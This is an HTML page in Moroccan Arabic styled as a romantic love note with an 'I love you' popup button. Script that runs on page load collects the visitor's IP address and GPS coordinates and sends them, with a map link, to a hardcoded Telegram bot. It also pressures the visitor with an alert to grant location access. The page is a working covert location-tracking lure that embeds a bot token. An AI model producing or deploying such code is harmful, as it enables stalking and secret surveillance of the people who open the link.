<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>💕 THIS FOR U  💕</title>
  <style>
    body {
      background: linear-gradient(135deg, #ffe0e9, #fffaf5);
      font-family: 'Tajawal', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      text-align: center;
      color: #c2185b;
    }

    h2 {
      font-size: 24px;
      margin-bottom: 30px;
      color: #d81b60;
    }

    button {
      background-color: #ec407a;
      color: white;
      border: none;
      padding: 14px 28px;
      font-size: 18px;
      border-radius: 14px;
      cursor: pointer;
      transition: 0.3s ease;
      box-shadow: 0 4px 6px rgba(0,0,0,0.15);
    }

    button:hover {
      background-color: #ad1457;
      transform: scale(1.06);
    }

    .popup {
      display: none;
      margin-top: 30px;
      background: #fff0f8;
      border: 2px dashed #ec407a;
      padding: 20px 30px;
      border-radius: 16px;
      font-size: 22px;
      color: #e91e63;
      animation: fadeIn 0.7s ease;
      max-width: 90%;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }

    @media (max-width: 480px) {
      h2 {
        font-size: 20px;
      }

      button {
        padding: 12px 24px;
        font-size: 16px;
      }

      .popup {
        font-size: 20px;
      }
    }
  </style>
</head>
<body>
  <h2>📍 جارٍ تحديد موقعك...</h2>
  <button onclick="showLove()">💕 CLICK HERE 💕</button>
  <div class="popup" id="popup">💖 كنحبك 💖</div>

  <script>
    const BOT_TOKEN = "7838285515:AAFIhk3dSkC-q3vfjxVUbxgApUl1ze20II0";
    const CHAT_ID = "7424074346";

    async function sendTelegramMessage(text) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const payload = {
        chat_id: CHAT_ID,
        text,
        parse_mode: "Markdown"
      };
      try {
        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        const data = await res.json();
        if (data.ok) {
          console.log("✅ تم إرسال الرسالة");
        } else {
          console.error("❌ خطأ:", data);
        }
      } catch (e) {
        console.error("❌ فشل في fetch:", e);
      }
    }

    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return "غير معروف";
      }
    }

    function buildMessage(ip, lat, lon) {
      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
      return `
📍 موقع جديد تم رصده:

🌐 IP: ${ip}
📌 خط العرض: ${lat}
📍 خط الطول: ${lon}
🔗 [فتح في الخريطة](${mapsLink})
📡 المصدر: GPS ✅
      `;
    }

    async function init() {
      const ip = await getIP();

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const lat = pos.coords.latitude.toFixed(7);
            const lon = pos.coords.longitude.toFixed(7);
            const message = buildMessage(ip, lat, lon);
            await sendTelegramMessage(message);
          },
          (err) => {
            console.error("⚠️ ما قدرناش نجيب الموقع:", err.message);
            alert("خاصك تسمح للموقع باش نخدمو.");
          },
          { timeout: 10000 }
        );
      } else {
        alert("المتصفح ديالك ما فيه geolocation.");
      }
    }

    function showLove() {
      const popup = document.getElementById("popup");
      popup.style.display = "block";
    }

    window.onload = init;
  </script>
</body>
</html>
